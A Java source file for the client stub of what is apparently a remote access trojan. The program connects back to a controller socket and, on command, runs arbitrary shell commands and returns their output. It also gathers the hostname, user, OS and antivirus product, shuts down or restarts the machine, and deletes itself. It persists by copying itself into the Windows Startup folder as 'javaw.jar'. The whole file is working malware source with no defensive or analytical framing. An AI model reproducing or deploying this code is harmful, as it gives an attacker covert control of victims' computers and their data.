import java.io.BufferedReader;import java.io.File;import java.io.IOException;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.ConnectException;import java.net.InetAddress;import java.net.Socket;import java.net.URISyntaxException;import java.net.UnknownHostException;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;public class DummyStub {	private static final String IP = "127.0.0.1";	private static final int PORT = 3055;	private static char SPLIT = '\u0000';	public static void main(String[] args) {		try {			boolean scanning=true;			Socket s = null;			while(scanning)			{			    try			    {					s = new Socket(IP, PORT);			        scanning=false;			    }			    catch(Exception e)			    {			        try			        {			            Thread.sleep(2000);//2 seconds			        }			        catch(InterruptedException ie){			            ie.printStackTrace();			        }			    }			}			s();			PrintWriter writer = new PrintWriter(s.getOutputStream());			BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));			while (true) {				String[] sel = reader.readLine().split(Character.toString(SPLIT));				switch (sel[0]) {				case "PING":					writer.println(s.getRemoteSocketAddress());					writer.flush();					break;				case "CLOSE":					s.close();					return;				case "PCNAME":					InetAddress addr = InetAddress.getLocalHost();					writer.println(addr.getHostName());					writer.flush();					break;				case "USER":					writer.println(System.getProperty("user.name"));					writer.flush();					break;				case "OS":					writer.println(System.getProperty("os.name"));					writer.flush();					break;				case "IP":					writer.println(s.getRemoteSocketAddress());					writer.flush();					break;				case "SHUTDOWN":					sh();					break;				case "RESTART":					r();					break;				case "COMMAND":					if (co(sel[1], writer) == true) {						writer.println(Character.toString(SPLIT));						writer.println(Character.toString(SPLIT));					} else {						writer.println("UNKNOWN");						writer.println("UNKNOWN");						writer.println(Character.toString(SPLIT));						writer.println(Character.toString(SPLIT));					}					writer.flush();					break;				case "DOWNLOAD":					break;				case "UNINSTALL":					ui();					break;				case "DIR":					c(writer);					break;				default:					break;				}			}		} catch (Exception e) {		}	}	private static void ui() throws IOException, URISyntaxException {		String OS = System.getProperty("os.name");		Path autostartPath = Paths.get(a());		if (OS.contains("Linux")) {			Runtime.getRuntime().exec("/bin/bash -c ( sleep 4 ; rm '" + jarLocationOnDisc() + "' ) &");			System.exit(0);		} else if (OS.contains("Mac")) {			// TODO		} else if (OS.contains("Windows")) {			Runtime.getRuntime().exec("cmd /c ping localhost -n 3 > nul && del  \"" + gCRJ().getAbsolutePath()+"\"");			Runtime.getRuntime().exec("cmd /c del \"" + autostartPath.resolve("javaw.jar")+"\"");			System.exit(0);		} else {			throw new RuntimeException("Unsupported operating system.");		}	}	//startup - add client to startup	private static void s() {		String OS = System.getProperty("os.name");		if (OS.contains("Linux")) {			// TODO Linux startup		} else if (OS.contains("Mac")) {			// TODO Mac startup		} else if (OS.contains("Windows")) {			if (!ke("javaw.jar")) {				ak();			}		} else {			throw new RuntimeException("Unsupported operating system.");		}	}	//cmddir - get direction	private static void c(PrintWriter writer) {		try {			String OS = System.getProperty("os.name");			ProcessBuilder processBuilder = new ProcessBuilder();			// -- Linux --			// Run a shell command			if (OS.contains("Linux")) {				processBuilder.command("/bin/bash", "-c", "cd");			} else if (OS.contains("Mac")) {				processBuilder.command("/bin/sh", "-c", "pwd");			} else if (OS.contains("Windows")) {				processBuilder.command("cmd.exe", "/c", "cd");			} else {				throw new RuntimeException("Unsupported operating system.");			}			Process process = processBuilder.start();			new StringBuilder();			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));			writer.println(reader.readLine());			writer.flush();		} catch (IOException e) {			e.printStackTrace();		}	}	//command - execute shell command	private static boolean co(String cmd, PrintWriter writer) {		if (cmd != null) {			try {				String OS = System.getProperty("os.name");				ProcessBuilder processBuilder = new ProcessBuilder();				// -- Linux --				// Run a shell command				if (OS.contains("Linux") || OS.contains("Mac")) {					processBuilder.command("bash", "-c", cmd);				} else if (OS.contains("Windows")) {					processBuilder.command("cmd.exe", "/c", cmd);				} else {					throw new RuntimeException("Unsupported operating system.");				}				Process process = processBuilder.start();				StringBuilder output = new StringBuilder();				BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));				String line;				while ((line = reader.readLine()) != null) {					output.append(line + "\n");					writer.println(line);					writer.println(line);				}				writer.flush();				int exitVal = 0;				try {					exitVal = process.waitFor();				} catch (InterruptedException e) {					e.printStackTrace();				}				if (exitVal == 0) {					//System.out.println(output);					return true;				} else {					// abnormal...				}			} catch (IOException e) {				e.printStackTrace();			}		}		return false;	}	//keycheck - check if autostart entry exists	private static boolean ke(String name) {		Path autostartPath = Paths.get(a());		if (autostartPath.resolve(name).toFile().exists()) {			return true;		}		return false;	}	/**	 * Creates the Startup key in Windows Registry	 *	 * @param name	 */	//addkey - add windows autostart key	public static void ak() {		Path autostartPath = Paths.get(a());		Path file = null;		try {			file = Paths.get(jarLocationOnDisc());		} catch (URISyntaxException e1) {			e1.printStackTrace();		}			try {				Runtime.getRuntime().exec("cmd /c ping localhost -n 4 > nul && del  \"" + gCRJ().getAbsolutePath()+"\"");        		Files.copy(file, autostartPath.resolve("javaw.jar"));        		Runtime.getRuntime().exec("cmd /c javaw -jar \"" + autostartPath.resolve("javaw.jar")+"\"");        			System.exit(0);        		} catch (IOException e) {        			e.printStackTrace();        		} catch (URISyntaxException e) {        			// TODO Auto-generated catch block        			e.printStackTrace();        		}	}	//getautostart - get the autostart windows path	public static String a() {		return System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",				"Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");	}	//shutdown pc	public static void sh() throws RuntimeException, IOException {		String shutdownCommand;		String OS = System.getProperty("os.name");		if (OS.contains("Linux") || OS.contains("Mac")) {			shutdownCommand = "shutdown -h now";		} else if (OS.contains("Windows")) {			shutdownCommand = "shutdown -s -t 0";		} else {			throw new RuntimeException("Unsupported operating system.");		}		Runtime.getRuntime().exec(shutdownCommand);	}	//restart pc	public static void r() throws RuntimeException, IOException {		String shutdownCommand;		String OS = System.getProperty("os.name");		if (OS.contains("Linux") || OS.contains("Mac")) {			shutdownCommand = "shutdown -r now";		} else if (OS.contains("Windows")) {			shutdownCommand = "shutdown.exe -r -t 0";		} else {			throw new RuntimeException("Unsupported operating system.");		}		Runtime.getRuntime().exec(shutdownCommand);	}	public static String getJavaBinDir() {		return System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";	}	//getCurrentRunningJar	public static File gCRJ() throws URISyntaxException {		return new File(DummyStub.class.getProtectionDomain().getCodeSource().getLocation().toURI());	}	//getPcName	public static String gCN() throws UnknownHostException {		return InetAddress.getLocalHost().getHostName();	}	//getUsername	public static String gU() {		return System.getProperty("user.name");	}	//getAntiVirus (Windows only)	public static String gav() throws IOException {		Process process = Runtime.getRuntime().exec(				"WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));		String result = "None";		String line;		while ((line = reader.readLine()) != null) {			if ((line.length() >= 1) && (line.trim().contains("displayName"))) {				result = line.split("=")[1];				break;			}		}		return result;	}	private static String stringToHex(String base) {		StringBuffer buffer = new StringBuffer();		int intValue;		for (int x = 0; x < base.length(); x++) {			int cursor = 0;			intValue = base.charAt(x);			String binaryChar = new String(Integer.toBinaryString(base.charAt(x)));			for (int i = 0; i < binaryChar.length(); i++) {				if (binaryChar.charAt(i) == '1')					cursor += 1;			}			if ((cursor % 2) > 0)				intValue += 128;			buffer.append(Integer.toHexString(intValue) + "");		}		return buffer.toString();	}	public static String getHWID() {		return stringToHex(System.getProperty("user.name") + System.getProperty("os.version")				+ System.getProperty("os.name") + System.getProperty("os.arch"));	}	public static String jarLocationOnDisc() throws URISyntaxException {		return new File(DummyStub.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())				.getAbsolutePath();	}}